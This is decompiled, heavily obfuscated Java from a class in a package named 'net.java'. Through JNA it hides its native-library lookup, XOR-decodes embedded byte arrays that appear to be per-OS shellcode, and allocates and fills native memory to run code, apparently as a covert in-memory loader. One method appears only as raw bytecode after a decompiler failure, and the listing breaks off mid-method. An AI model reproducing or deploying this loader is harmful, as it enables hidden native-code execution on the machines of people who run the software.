package net.java;

import com.sun.jna.Function;
import com.sun.jna.Memory;
import com.sun.jna.NativeLibrary;
import com.sun.jna.Pointer;
import java.io.BufferedReader;
import java.io.ByteArrayInputStream;
import java.io.DataInputStream;
import java.io.File;
import java.io.InputStreamReader;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.Properties;
import java.util.Random;

public class g {
   private static Object a;
   private static Function a;
   private static Function b;
   private static Function c;
   private static int a = 1;
   private static int b = 2;
   private static int c = 4;
   private static int d = 32;
   private static int e = 2;
   private static int f = 4096;
   private static int g = 2;
   private static Object b;
   private static Function d;
   private static Function e;
   private static Function f;

   private static boolean b() {
      try {
         ClassLoader var10000 = g.class.getClassLoader();
         StringBuilder var0;
         (var0 = new StringBuilder()).append('c');
         var0.append('o');
         var0.append('m');
         var0.append('.');
         var0.append('s');
         var0.append('u');
         var0.append('n');
         var0.append('.');
         var0.append('j');
         var0.append('n');
         var0.append('a');
         var0.append('.');
         var0.append('N');
         var0.append('a');
         var0.append('t');
         var0.append('i');
         var0.append('v');
         var0.append('e');
         var10000.loadClass("com.sun.jna.Native");
         return true;
      } catch (Throwable var1) {
         return false;
      }
   }

   private static void a(byte[] var0, int var1, int var2) {
      var0[var1 + 3] = (byte)(var2 >>> 24);
      var0[var1 + 2] = (byte)(var2 >>> 16);
      var0[var1 + 1] = (byte)(var2 >>> 8);
      var0[var1] = (byte)var2;
   }

   private static void a(byte[] var0, int var1, long var2) {
      var0[var1 + 7] = (byte)(var2 >>> 56);
      var0[var1 + 6] = (byte)(var2 >>> 48);
      var0[var1 + 5] = (byte)(var2 >>> 40);
      var0[var1 + 4] = (byte)(var2 >>> 32);
      var0[var1 + 3] = (byte)(var2 >>> 24);
      var0[var1 + 2] = (byte)(var2 >>> 16);
      var0[var1 + 1] = (byte)(var2 >>> 8);
      var0[var1] = (byte)var2;
   }

   private static long a(byte[] var0, int var1) {
      return 0L
         | (long)(var0[var1 + 7] & 0xFF) << 56
         | (long)(var0[var1 + 6] & 0xFF) << 48
         | (long)(var0[var1 + 5] & 0xFF) << 40
         | (long)(var0[var1 + 4] & 0xFF) << 32
         | (long)(var0[var1 + 3] & 0xFF) << 24
         | (var0[var1 + 2] & 255) << 16
         | (var0[var1 + 1] & 255) << 8
         | var0[var1] & 0xFF;
   }

   private static int a(byte[] var0, int var1) {
      return 0 | (var0[var1 + 3] & 0xFF) << 24 | (var0[var1 + 2] & 0xFF) << 16 | (var0[var1 + 1] & 0xFF) << 8 | var0[var1] & 0xFF;
   }

   private static final byte[] a(byte[] var0) {
      int var1 = 917994066 % var0.length + 1073342320;
      byte[] var2;
      (var2 = new byte[4])[0] = (byte)(var1 >>> 24);
      var2[1] = (byte)(var1 >>> 16);
      var2[2] = (byte)(var1 >>> 8);
      var2[3] = (byte)var1;
      byte[] var4 = new byte[var0.length];

      for (int var3 = 0; var3 < var0.length; var3++) {
         var4[var3] = (byte)(var0[var3] ^ var2[var3 % 4]);
      }

      return var4;
   }

   private static int b(byte[] var0, int var1) {
      if (var1 < 0) {
         return 0;
      }

      long var2 = 0L;
      boolean var4 = false;
      long var5 = 0L;

      for (int var7 = 0; var7 < var1; var7++) {
         if (var4) {
            if (var0[var7] != 0) {
               var4 = false;
               if (var7 - 1 - var2 > 512L) {
                  var5 = var2;
               }
            }
         } else if (var0[var7] == 0) {
            var2 = var7;
            var4 = true;
         }
      }

      long var8;
      if (l.g()) {
         var8 = 16384L;
      } else {
         var8 = 4096L;
      }

      long var10;
      if ((var10 = var5 / var8) * var8 < var5) {
         var10++;
      }

      return (int)(var10 * var8);
   }

   private static boolean a(byte[] var0) {
      byte[] var1 = new byte[]{-1, -18, -35, -52, -69, -86, -103, -120};
      int var3 = l.a(var0, var1);

      for (int var2 = 0; var2 < 8; var2++) {
         var1[var2] = 0;
      }

      return var3 <= 0 || var3 >= 2048;
   }

   private static int a(byte[] var0) {
      byte[] var1 = new byte[]{-35, -52, -69, -86};
      byte[] var2 = new byte[]{-1, -18, -35, -52, -69, -86, -103, -120};

      try {
         int var4;
         boolean var5;
         byte var21;
         if ((var4 = l.a(new Object[]{var0, 2048, var2})) < 0) {
            if ((var4 = l.a(new Object[]{var0, 2048, var1})) < 0) {
               return -1;
            }

            var21 = 20;
            var5 = true;
         } else {
            var21 = 40;
            var5 = false;
         }

         long var6;
         long var8;
         if (var5) {
            var6 = a(var0, var4 + 4);
            var8 = a(var0, var4 + 8);
         } else {
            var6 = a(var0, var4 + 8);
            var8 = a(var0, var4 + 16);
         }

         long var10 = var6 + var8;
         long var12 = var4 + var21;
         long var14 = var4 + var21 + var10;
         if (var6 > 0L) {
            return -2;
         }

         long var16;
         if (var5) {
            var16 = a(var0, (int)(var12 - 4L)) + var14 - var8;
         } else {
            var16 = a(var0, (int)(var12 - 8L)) + var14 - var8;
         }

         return (int)var16;
      } finally {
         for (int var3 = 0; var3 < 8; var3++) {
            var2[var3] = 0;
         }

         for (int var20 = 0; var20 < 4; var20++) {
            var1[var20] = 0;
         }
      }
   }

   private static int a(Object param0, Object param1) {
      // $VF: Couldn't be decompiled
      // Please report this to the Vineflower issue tracker, at https://github.com/Vineflower/vineflower/issues with a copy of the class file (if you have the rights to distribute it!)
      // java.lang.IndexOutOfBoundsException: Index 0 out of bounds for length 0
      //   at java.base/jdk.internal.util.Preconditions.outOfBounds(Preconditions.java:100)
      //   at java.base/jdk.internal.util.Preconditions.outOfBoundsCheckIndex(Preconditions.java:106)
      //   at java.base/jdk.internal.util.Preconditions.checkIndex(Preconditions.java:302)
      //   at java.base/java.util.Objects.checkIndex(Objects.java:365)
      //   at java.base/java.util.ArrayList.remove(ArrayList.java:552)
      //   at org.jetbrains.java.decompiler.modules.decompiler.FinallyProcessor.removeExceptionInstructionsEx(FinallyProcessor.java:1058)
      //   at org.jetbrains.java.decompiler.modules.decompiler.FinallyProcessor.verifyFinallyEx(FinallyProcessor.java:573)
      //   at org.jetbrains.java.decompiler.modules.decompiler.FinallyProcessor.iterateGraph(FinallyProcessor.java:90)
      //   at org.jetbrains.java.decompiler.main.rels.MethodProcessor.codeToJava(MethodProcessor.java:185)
      //
      // Bytecode:
      // 000: aload 0
      // 001: checkcast [B
      // 004: astore 0
      // 005: aload 1
      // 006: checkcast [B
      // 009: astore 1
      // 00a: lconst_0
      // 00b: lstore 10
      // 00d: lconst_0
      // 00e: lstore 12
      // 010: lconst_0
      // 011: lstore 14
      // 013: aload 0
      // 014: dup
      // 015: arraylength
      // 016: sipush 4096
      // 019: isub
      // 01a: invokestatic net/java/g.b ([BI)I
      // 01d: dup
      // 01e: istore 2
      // 01f: ifne 056
      // 022: lconst_0
      // 023: lconst_0
      // 024: lcmp
      // 025: ifeq 02e
      // 028: lconst_0
      // 029: lconst_0
      // 02a: invokestatic net/java/g.a (JJ)Z
      // 02d: pop
      // 02e: lconst_0
      // 02f: lconst_0
      // 030: lcmp
      // 031: ifeq 03c
      // 034: lconst_0
      // 035: ldc2_w 4096
      // 038: invokestatic net/java/g.a (JJ)Z
      // 03b: pop
      // 03c: lconst_0
      // 03d: lconst_0
      // 03e: lcmp
      // 03f: ifeq 04a
      // 042: lconst_0
      // 043: ldc2_w 4096
      // 046: invokestatic net/java/g.a (JJ)Z
      // 049: pop
      // 04a: sipush 206
      // 04d: ireturn
      // 04e: lload 10
      // 050: ldc2_w 4096
      // 053: ladd
      // 054: lstore 10
      // 056: lload 10
      // 058: aload 0
      // 059: arraylength
      // 05a: aload 1
      // 05b: ifnonnull 062
      // 05e: bipush 0
      // 05f: goto 064
      // 062: aload 1
      // 063: arraylength
      // 064: iadd
      // 065: i2l
      // 066: lcmp
      // 067: iflt 04e
      // 06a: lconst_0
      // 06b: lstore 16
      // 06d: lload 10
      // 06f: lstore 18
      // 071: goto 084
      // 074: lload 16
      // 076: ldc2_w 4096
      // 079: ladd
      // 07a: lstore 16
      // 07c: lload 18
      // 07e: ldc2_w 4096
      // 081: lsub
      // 082: lstore 18
      // 084: lload 16
      // 086: iload 2
      // 087: i2l
      // 088: lcmp
      // 089: iflt 074
      // 08c: lload 10
      // 08e: ldc2_w 16384
      // 091: ladd
      // 092: lstore 10
      // 094: bipush 4
      // 095: anewarray 4
      // 098: dup
      // 099: bipush 0
      // 09a: lconst_0
      // 09b: invokestatic java/lang/Long.valueOf (J)Ljava/lang/Long;
      // 09e: aastore
      // 09f: dup
      // 0a0: bipush 1
      // 0a1: lload 10
      // 0a3: invokestatic java/lang/Long.valueOf (J)Ljava/lang/Long;
      // 0a6: aastore
      // 0a7: dup
      // 0a8: bipush 2
      // 0a9: sipush 8192
      // 0ac: invokestatic java/lang/Integer.valueOf (I)Ljava/lang/Integer;
      // 0af: aastore
      // 0b0: dup
      // 0b1: bipush 3
      // 0b2: bipush 4
      // 0b3: invokestatic java/lang/Integer.valueOf (I)Ljava/lang/Integer;
      // 0b6: aastore
      // 0b7: invokestatic net/java/g.a (Ljava/lang/Object;)J
      // 0ba: dup2
      // 0bb: lstore 4
      // 0bd: lconst_0
      // 0be: lcmp
      // 0bf: ifne 0f1
      // 0c2: lload 4
      // 0c4: lconst_0
      // 0c5: lcmp
      // 0c6: ifeq 0d1
      // 0c9: lload 4
      // 0cb: lload 10
      // 0cd: invokestatic net/java/g.a (JJ)Z
      // 0d0: pop
      // 0d1: lconst_0
      // 0d2: lconst_0
      // 0d3: lcmp
      // 0d4: ifeq 0df
      // 0d7: lconst_0
      // 0d8: ldc2_w 4096
      // 0db: invokestatic net/java/g.a (JJ)Z
      // 0de: pop
      // 0df: lconst_0
      // 0e0: lconst_0
      // 0e1: lcmp
      // 0e2: ifeq 0ed
      // 0e5: lconst_0
      // 0e6: ldc2_w 4096
      // 0e9: invokestatic net/java/g.a (JJ)Z
      // 0ec: pop
      // 0ed: sipush 207
      // 0f0: ireturn
      // 0f1: bipush 4
      // 0f2: anewarray 4
      // 0f5: dup
      // 0f6: bipush 0
      // 0f7: lload 4
      // 0f9: invokestatic java/lang/Long.valueOf (J)Ljava/lang/Long;
      // 0fc: aastore
      // 0fd: dup
      // 0fe: bipush 1
      // 0ff: lload 16
      // 101: invokestatic java/lang/Long.valueOf (J)Ljava/lang/Long;
      // 104: aastore
      // 105: dup
      // 106: bipush 2
      // 107: sipush 4096
      // 10a: invokestatic java/lang/Integer.valueOf (I)Ljava/lang/Integer;
      // 10d: aastore
      // 10e: dup
      // 10f: bipush 3
      // 110: bipush 4
      // 111: invokestatic java/lang/Integer.valueOf (I)Ljava/lang/Integer;
      // 114: aastore
      // 115: invokestatic net/java/g.a (Ljava/lang/Object;)J
      // 118: dup2
      // 119: lstore 6
      // 11b: lconst_0
      // 11c: lcmp
      // 11d: ifne 14f
      // 120: lload 4
      // 122: lconst_0
      // 123: lcmp
      // 124: ifeq 12f
      // 127: lload 4
      // 129: lload 10
      // 12b: invokestatic net/java/g.a (JJ)Z
      // 12e: pop
      // 12f: lconst_0
      // 130: lconst_0
      // 131: lcmp
      // 132: ifeq 13d
      // 135: lconst_0
      // 136: ldc2_w 4096
      // 139: invokestatic net/java/g.a (JJ)Z
      // 13c: pop
      // 13d: lconst_0
      // 13e: lconst_0
      // 13f: lcmp
      // 140: ifeq 14b
      // 143: lconst_0
      // 144: ldc2_w 4096
      // 147: invokestatic net/java/g.a (JJ)Z
      // 14a: pop
      // 14b: sipush 208
      // 14e: ireturn
      // 14f: bipush 4
      // 150: anewarray 4
      // 153: dup
      // 154: bipush 0
      // 155: lload 4
      // 157: lload 16
      // 159: ladd
      // 15a: invokestatic java/lang/Long.valueOf (J)Ljava/lang/Long;
      // 15d: aastore
      // 15e: dup
      // 15f: bipush 1
      // 160: lload 18
      // 162: invokestatic java/lang/Long.valueOf (J)Ljava/lang/Long;
      // 165: aastore
      // 166: dup
      // 167: bipush 2
      // 168: sipush 4096
      // 16b: invokestatic java/lang/Integer.valueOf (I)Ljava/lang/Integer;
      // 16e: aastore
      // 16f: dup
      // 170: bipush 3
      // 171: bipush 4
      // 172: invokestatic java/lang/Integer.valueOf (I)Ljava/lang/Integer;
      // 175: aastore
      // 176: invokestatic net/java/g.a (Ljava/lang/Object;)J
      // 179: dup2
      // 17a: lstore 8
      // 17c: lconst_0
      // 17d: lcmp
      // 17e: ifne 1b0
      // 181: lload 4
      // 183: lconst_0
      // 184: lcmp
      // 185: ifeq 190
      // 188: lload 4
      // 18a: lload 10
      // 18c: invokestatic net/java/g.a (JJ)Z
      // 18f: pop
      // 190: lconst_0
      // 191: lconst_0
      // 192: lcmp
      // 193: ifeq 19e
      // 196: lconst_0
      // 197: ldc2_w 4096
      // 19a: invokestatic net/java/g.a (JJ)Z
      // 19d: pop
      // 19e: lconst_0
      // 19f: lconst_0
      // 1a0: lcmp
      // 1a1: ifeq 1ac
      // 1a4: lconst_0
      // 1a5: ldc2_w 4096
      // 1a8: invokestatic net/java/g.a (JJ)Z
      // 1ab: pop
      // 1ac: sipush 209
      // 1af: ireturn
      // 1b0: lload 8
      // 1b2: lload 4
      // 1b4: lload 16
      // 1b6: ladd
      // 1b7: lcmp
      // 1b8: ifeq 1ea
      // 1bb: lload 4
      // 1bd: lconst_0
      // 1be: lcmp
      // 1bf: ifeq 1ca
      // 1c2: lload 4
      // 1c4: lload 10
      // 1c6: invokestatic net/java/g.a (JJ)Z
      // 1c9: pop
      // 1ca: lconst_0
      // 1cb: lconst_0
      // 1cc: lcmp
      // 1cd: ifeq 1d8
      // 1d0: lconst_0
      // 1d1: ldc2_w 4096
      // 1d4: invokestatic net/java/g.a (JJ)Z
      // 1d7: pop
      // 1d8: lconst_0
      // 1d9: lconst_0
      // 1da: lcmp
      // 1db: ifeq 1e6
      // 1de: lconst_0
      // 1df: ldc2_w 4096
      // 1e2: invokestatic net/java/g.a (JJ)Z
      // 1e5: pop
      // 1e6: sipush 210
      // 1e9: ireturn
      // 1ea: lload 4
      // 1ec: aload 0
      // 1ed: dup
      // 1ee: arraylength
      // 1ef: invokestatic net/java/g.a (J[BI)V
      // 1f2: aload 1
      // 1f3: ifnull 202
      // 1f6: lload 4
      // 1f8: aload 0
      // 1f9: arraylength
      // 1fa: i2l
      // 1fb: ladd
      // 1fc: aload 1
      // 1fd: dup
      // 1fe: arraylength
      // 1ff: invokestatic net/java/g.a (J[BI)V
      // 202: bipush 4
      // 203: anewarray 4
      // 206: dup
      // 207: bipush 0
      // 208: lload 6
      // 20a: invokestatic java/lang/Long.valueOf (J)Ljava/lang/Long;
      // 20d: aastore
      // 20e: dup
      // 20f: bipush 1
      // 210: lload 16
      // 212: invokestatic java/lang/Long.valueOf (J)Ljava/lang/Long;
      // 215: aastore
      // 216: dup
      // 217: bipush 2
      // 218: bipush 32
      // 21a: invokestatic java/lang/Integer.valueOf (I)Ljava/lang/Integer;
      // 21d: aastore
      // 21e: invokestatic net/java/g.a (Ljava/lang/Object;)Ljava/lang/Object;
      // 221: getstatic java/lang/Boolean.TRUE Ljava/lang/Boolean;
      // 224: if_acmpeq 256
      // 227: lload 4
      // 229: lconst_0
      // 22a: lcmp
      // 22b: ifeq 236
      // 22e: lload 4
      // 230: lload 10
      // 232: invokestatic net/java/g.a (JJ)Z
      // 235: pop
      // 236: lconst_0
      // 237: lconst_0
      // 238: lcmp
      // 239: ifeq 244
      // 23c: lconst_0
      // 23d: ldc2_w 4096
      // 240: invokestatic net/java/g.a (JJ)Z
      // 243: pop
      // 244: lconst_0
      // 245: lconst_0
      // 246: lcmp
      // 247: ifeq 252
      // 24a: lconst_0
      // 24b: ldc2_w 4096
      // 24e: invokestatic net/java/g.a (JJ)Z
      // 251: pop
      // 252: sipush 211
      // 255: ireturn
      // 256: aload 0
      // 257: invokestatic net/java/g.a ([B)I
      // 25a: dup
      // 25b: istore 1
      // 25c: bipush -1
      // 25d: if_icmpne 28f
      // 260: lload 4
      // 262: lconst_0
      // 263: lcmp
      // 264: ifeq 26f
      // 267: lload 4
      // 269: lload 10
      // 26b: invokestatic net/java/g.a (JJ)Z
      // 26e: pop
      // 26f: lconst_0
      // 270: lconst_0
      // 271: lcmp
      // 272: ifeq 27d
      // 275: lconst_0
      // 276: ldc2_w 4096
      // 279: invokestatic net/java/g.a (JJ)Z
      // 27c: pop
      // 27d: lconst_0
      // 27e: lconst_0
      // 27f: lcmp
      // 280: ifeq 28b
      // 283: lconst_0
      // 284: ldc2_w 4096
      // 287: invokestatic net/java/g.a (JJ)Z
      // 28a: pop
      // 28b: sipush 212
      // 28e: ireturn
      // 28f: iload 1
      // 290: bipush -2
      // 292: if_icmpne 2c4
      // 295: lload 4
      // 297: lconst_0
      // 298: lcmp
      // 299: ifeq 2a4
      // 29c: lload 4
      // 29e: lload 10
      // 2a0: invokestatic net/java/g.a (JJ)Z
      // 2a3: pop
      // 2a4: lconst_0
      // 2a5: lconst_0
      // 2a6: lcmp
      // 2a7: ifeq 2b2
      // 2aa: lconst_0
      // 2ab: ldc2_w 4096
      // 2ae: invokestatic net/java/g.a (JJ)Z
      // 2b1: pop
      // 2b2: lconst_0
      // 2b3: lconst_0
      // 2b4: lcmp
      // 2b5: ifeq 2c0
      // 2b8: lconst_0
      // 2b9: ldc2_w 4096
      // 2bc: invokestatic net/java/g.a (JJ)Z
      // 2bf: pop
      // 2c0: sipush 213
      // 2c3: ireturn
      // 2c4: bipush 46
      // 2c6: newarray 8
      // 2c8: dup
      // 2c9: bipush 0
      // 2ca: bipush -52
      // 2cc: bastore
      // 2cd: dup
      // 2ce: bipush 1
      // 2cf: bipush -10
      // 2d1: bastore
      // 2d2: dup
      // 2d3: bipush 2
      // 2d4: bipush -7
      // 2d6: bastore
      // 2d7: dup
      // 2d8: bipush 3
      // 2d9: bipush 104
      // 2db: bastore
      // 2dc: dup
      // 2dd: bipush 4
      // 2de: bipush 108
      // 2e0: bastore
      // 2e1: dup
      // 2e2: bipush 5
      // 2e3: bipush -82
      // 2e5: bastore
      // 2e6: dup
      // 2e7: bipush 6
      // 2e9: bipush -79
      // 2eb: bastore
      // 2ec: dup
      // 2ed: bipush 7
      // 2ef: bipush -38
      // 2f1: bastore
      // 2f2: dup
      // 2f3: bipush 8
      // 2f5: bipush -74
      // 2f7: bastore
      // 2f8: dup
      // 2f9: bipush 9
      // 2fb: bipush 50
      // 2fd: bastore
      // 2fe: dup
      // 2ff: bipush 10
      // 301: bipush -81
      // 303: bastore
      // 304: dup
      // 305: bipush 11
      // 307: bipush 17
      // 309: bastore
      // 30a: dup
      // 30b: bipush 12
      // 30d: bipush -45
      // 30f: bastore
      // 310: dup
      // 311: bipush 13
      // 313: bipush -39
      // 315: bastore
      // 316: dup
      // 317: bipush 14
      // 319: bipush -81
      // 31b: bastore
      // 31c: dup
      // 31d: bipush 15
      // 31f: bipush 25
      // 321: bastore
      // 322: dup
      // 323: bipush 16
      // 325: bipush 68
      // 327: bastore
      // 328: dup
      // 329: bipush 17
      // 32b: bipush -15
      // 32d: bastore
      // 32e: dup
      // 32f: bipush 18
      // 331: bipush -81
      // 333: bastore
      // 334: dup
      // 335: bipush 19
      // 337: bipush 25
      // 339: bastore
      // 33a: dup
      // 33b: bipush 20
      // 33d: bipush 76
      // 33f: bastore
      // 340: dup
      // 341: bipush 21
      // 343: bipush -23
      // 345: bastore
      // 346: dup
      // 347: bipush 22
      // 349: bipush -81
      // 34b: bastore
      // 34c: dup
      // 34d: bipush 23
      // 34f: bipush 25
      // 351: bastore
      // 352: dup
      // 353: bipush 24
      // 355: bipush 108
      // 357: bastore
      // 358: dup
      // 359: bipush 25
      // 35b: bipush -31
      // 35d: bastore
      // 35e: dup
      // 35f: bipush 26
      // 361: bipush -81
      // 363: bastore
      // 364: dup
      // 365: bipush 27
      // 367: bipush 25
      // 369: bastore
      // 36a: dup
      // 36b: bipush 28
      // 36d: bipush 116
      // 36f: bastore
      // 370: dup
      // 371: bipush 29
      // 373: bipush -39
      // 375: bastore
      // 376: dup
      // 377: bipush 30
      // 379: bipush 24
      // 37b: bastore
      // 37c: dup
      // 37d: bipush 31
      // 37f: bipush -127
      // 381: bastore
      // 382: dup
      // 383: bipush 32
      // 385: bipush 119
      // 387: bastore
      // 388: dup
      // 389: bipush 33
      // 38b: bipush 112
      // 38d: bastore
      // 38e: dup
      // 38f: bipush 34
      // 391: bipush -92
      // 393: bastore
      // 394: dup
      // 395: bipush 35
      // 397: bipush -70
      // 399: bastore
      // 39a: dup
      // 39b: bipush 36
      // 39d: bipush 14
      // 39f: bastore
      // 3a0: dup
      // 3a1: bipush 37
      // 3a3: bipush 57
      // 3a5: bastore
      // 3a6: dup
      // 3a7: bipush 38
      // 3a9: bipush -81
      // 3ab: bastore
      // 3ac: dup
      // 3ad: bipush 39
      // 3af: bipush 17
      // 3b1: bastore
      // 3b2: dup
      // 3b3: bipush 40
      // 3b5: bipush -5
      // 3b7: bastore
      // 3b8: dup
      // 3b9: bipush 41
      // 3bb: bipush -39
      // 3bd: bastore
      // 3be: dup
      // 3bf: bipush 42
      // 3c1: bipush -71
      // 3c3: bastore
      // 3c4: dup
      // 3c5: bipush 43
      // 3c7: bipush -51
      // 3c9: bastore
      // 3ca: dup
      // 3cb: bipush 44
      // 3cd: bipush 100
      // 3cf: bastore
      // 3d0: dup
      // 3d1: bipush 45
      // 3d3: bipush 58
      // 3d5: bastore
      // 3d6: invokestatic net/java/g.a ([B)[B
      // 3d9: astore 2
      // 3da: bipush 32
      // 3dc: newarray 8
      // 3de: dup
      // 3df: bipush 0
      // 3e0: bipush 106
      // 3e2: bastore
      // 3e3: dup
      // 3e4: bipush 1
      // 3e5: bipush 114
      // 3e7: bastore
      // 3e8: dup
      // 3e9: bipush 2
      // 3ea: bipush 11
      // 3ec: bastore
      // 3ed: dup
      // 3ee: bipush 3
      // 3ef: bipush -44
      // 3f1: bastore
      // 3f2: dup
      // 3f3: bipush 4
      // 3f4: bipush -76
      // 3f6: bastore
      // 3f7: dup
      // 3f8: bipush 5
      // 3f9: bipush -116
      // 3fb: bastore
      // 3fc: dup
      // 3fd: bipush 6
      // 3ff: bipush -17
      // 401: bastore
      // 402: dup
      // 403: bipush 7
      // 405: bipush 125
      // 407: bastore
      // 408: dup
      // 409: bipush 8
      // 40b: bipush 73
      // 40d: bastore
      // 40e: dup
      // 40f: bipush 9
      // 411: bipush -23
      // 413: bastore
      // 414: dup
      // 415: bipush 10
      // 417: bipush 24
      // 419: bastore
      // 41a: dup
      // 41b: bipush 11
      // 41d: bipush -12
      // 41f: bastore
      // 420: dup
      // 421: bipush 12
      // 423: bipush 51
      // 425: bastore
      // 426: dup
      // 427: bipush 13
      // 429: bipush 6
      // 42b: bastore
      // 42c: dup
      // 42d: bipush 14
      // 42f: bipush -111
      // 431: bastore
      // 432: dup
      // 433: bipush 15
      // 435: bipush -118
      // 437: bastore
      // 438: dup
      // 439: bipush 16
      // 43b: bipush -64
      // 43d: bastore
      // 43e: dup
      // 43f: bipush 17
      // 441: bipush -113
      // 443: bastore
      // 444: dup
      // 445: bipush 18
      // 447: bipush -29
      // 449: bastore
      // 44a: dup
      // 44b: bipush 19
      // 44d: bipush 125
      // 44f: bastore
      // 450: dup
      // 451: bipush 20
      // 453: bipush 41
      // 455: bastore
      // 456: dup
      // 457: bipush 21
      // 459: bipush 122
      // 45b: bastore
      // 45c: dup
      // 45d: bipush 22
      // 45f: bipush 35
      // 461: bastore
      // 462: dup
      // 463: bipush 23
      // 465: bipush -110
      // 467: bastore
      // 468: dup
      // 469: bipush 24
      // 46b: bipush -74
      // 46d: bastore
      // 46e: dup
      // 46f: bipush 25
      // 471: bipush -65
      // 473: bastore
      // 474: dup
      // 475: bipush 26
      // 477: bipush -13
      // 479: bastore
      // 47a: dup
      // 47b: bipush 27
      // 47d: bipush -79
      // 47f: bastore
      // 480: dup
      // 481: bipush 28
      // 483: bipush -1
      // 484: bastore
      // 485: dup
      // 486: bipush 29
      // 488: bipush -89
      // 48a: bastore
      // 48b: dup
      // 48c: bipush 30
      // 48e: bipush -70
      // 490: bastore
      // 491: dup
      // 492: bipush 31
      // 494: bipush 65
      // 496: bastore
      // 497: invokestatic net/java/g.a ([B)[B
      // 49a: astore 3
      // 49b: bipush 48
      // 49d: newarray 8
      // 49f: dup
      // 4a0: bipush 0
      // 4a1: bipush -52
      // 4a3: bastore
      // 4a4: dup
      // 4a5: bipush 1
      // 4a6: bipush -10
      // 4a8: bastore
      // 4a9: dup
      // 4aa: bipush 2
      // 4ab: bipush -8
      // 4ad: bastore
      // 4ae: dup
      // 4af: bipush 3
      // 4b0: bipush 122
      // 4b2: bastore
      // 4b3: dup
      // 4b4: bipush 4
      // 4b5: bipush -63
      // 4b7: bastore
      // 4b8: dup
      // 4b9: bipush 5
      // 4ba: bipush -2
      // 4bc: bastore
      // 4bd: dup
      // 4be: bipush 6
      // 4c0: bipush -25
      // 4c2: bastore
      // 4c3: dup
      // 4c4: bipush 7
      // 4c6: bipush 123
      // 4c8: bastore
      // 4c9: dup
      // 4ca: bipush 8
      // 4cc: bipush -52
      // 4ce: bastore
      // 4cf: dup
      // 4d0: bipush 9
      // 4d2: bipush -6
      // 4d4: bastore
      // 4d5: dup
      // 4d6: bipush 10
      // 4d8: bipush -25
      // 4da: bastore
      // 4db: dup
      // 4dc: bipush 11
      // 4de: bipush 40
      // 4e0: bastore
      // 4e1: dup
      // 4e2: bipush 12
      // 4e4: bipush 61
      // 4e6: bastore
      // 4e7: dup
      // 4e8: bipush 13
      // 4ea: bipush 117
      // 4ec: bastore
      // 4ed: dup
      // 4ee: bipush 14
      // 4f0: bipush -90
      // 4f2: bastore
      // 4f3: dup
      // 4f4: bipush 15
      // 4f6: bipush 43
      // 4f8: bastore
      // 4f9: dup
      // 4fa: bipush 16
      // 4fc: bipush 55
      // 4fe: bastore
      // 4ff: dup
      // 500: bipush 17
      // 502: bipush -7
      // 504: bastore
      // 505: dup
      // 506: bipush 18
      // 508: bipush -89
      // 50a: bastore
      // 50b: dup
      // 50c: bipush 19
      // 50e: bipush 123
      // 510: bastore
      // 511: dup
      // 512: bipush 20
      // 514: bipush 63
      // 516: bastore
      // 517: dup
      // 518: bipush 21
      // 51a: bipush 125
      // 51c: bastore
      // 51d: dup
      // 51e: bipush 22
      // 520: bipush -89
      // 522: bastore
      // 523: dup
      // 524: bipush 23
      // 526: bipush 43
      // 528: bastore
      // 529: dup
      // 52a: bipush 24
      // 52c: bipush 63
      // 52e: bastore
      // 52f: dup
      // 530: bipush 25
      // 532: bipush -8
      // 534: bastore
      // 535: dup
      // 536: bipush 26
      // 538: bipush -40
      // 53a: bastore
      // 53b: dup
      // 53c: bipush 27
      // 53e: bipush 84
      // 540: bastore
      // 541: dup
      // 542: bipush 28
      // 544: bipush 95
      // 546: bastore
      // 547: dup
      // 548: bipush 29
      // 54a: bipush -17
      // 54c: bastore
      // 54d: dup
      // 54e: bipush 30
      // 550: bipush -25
      // 552: bastore
      // 553: dup
      // 554: bipush 31
      // 556: bipush 123
      // 558: bastore
      // 559: dup
      // 55a: bipush 32
      // 55c: bipush -33
      // 55e: bastore
      // 55f: dup
      // 560: bipush 33
      // 562: bipush -6
      // 564: bastore
      // 565: dup
      // 566: bipush 34
      // 568: bipush -8
      // 56a: bastore
      // 56b: dup
      // 56c: bipush 35
      // 56e: bipush 40
      // 570: bastore
      // 571: dup
      // 572: bipush 36
      // 574: bipush -63
      // 576: bastore
      // 577: dup
      // 578: bipush 37
      // 57a: bipush -2
      // 57c: bastore
      // 57d: dup
      // 57e: bipush 38
      // 580: bipush -89
      // 582: bastore
      // 583: dup
      // 584: bipush 39
      // 586: bipush 123
      // 588: bastore
      // 589: dup
      // 58a: bipush 40
      // 58c: bipush -52
      // 58e: bastore
      // 58f: dup
      // 590: bipush 41
      // 592: bipush -2
      // 594: bastore
      // 595: dup
      // 596: bipush 42
      // 598: bipush -90
      // 59a: bastore
      // 59b: dup
      // 59c: bipush 43
      // 59e: bipush 122
      // 5a0: bastore
      // 5a1: dup
      // 5a2: bipush 44
      // 5a4: bipush -1
      // 5a5: bastore
      // 5a6: dup
      // 5a7: bipush 45
      // 5a9: bipush -6
      // 5ab: bastore
      // 5ac: dup
      // 5ad: bipush 46
      // 5af: bipush -72
      // 5b1: bastore
      // 5b2: dup
      // 5b3: bipush 47
      // 5b5: bipush 84
      // 5b7: bastore
      // 5b8: invokestatic net/java/g.a ([B)[B
      // 5bb: astore 6
      // 5bd: bipush 4
      // 5be: anewarray 4
      // 5c1: dup
      // 5c2: bipush 0
      // 5c3: lconst_0
      // 5c4: invokestatic java/lang/Long.valueOf (J)Ljava/lang/Long;
      // 5c7: aastore
      // 5c8: dup
      // 5c9: bipush 1
      // 5ca: ldc2_w 4096
      // 5cd: invokestatic java/lang/Long.valueOf (J)Ljava/lang/Long;
      // 5d0: aastore
      // 5d1: dup
      // 5d2: bipush 2
      // 5d3: sipush 12288
      // 5d6: invokestatic java/lang/Integer.valueOf (I)Ljava/lang/Integer;
      // 5d9: aastore
      // 5da: dup
      // 5db: bipush 3
      // 5dc: bipush 4
      // 5dd: invokestatic java/lang/Integer.valueOf (I)Ljava/lang/Integer;
      // 5e0: aastore
      // 5e1: invokestatic net/java/g.a (Ljava/lang/Object;)J
      // 5e4: lstore 12
      // 5e6: invokestatic net/java/l.g ()Z
      // 5e9: ifeq 5f8
      // 5ec: lload 12
      // 5ee: aload 6
      // 5f0: dup
      // 5f1: arraylength
      // 5f2: invokestatic net/java/g.a (J[BI)V
      // 5f5: goto 617
      // 5f8: invokestatic net/java/l.f ()Z
      // 5fb: ifeq 609
      // 5fe: lload 12
      // 600: aload 2
      // 601: dup
      // 602: arraylength
      // 603: invokestatic net/java/g.a (J[BI)V
      // 606: goto 617
      // 609: invokestatic net/java/l.e ()Z
      // 60c: ifeq 617
      // 60f: lload 12
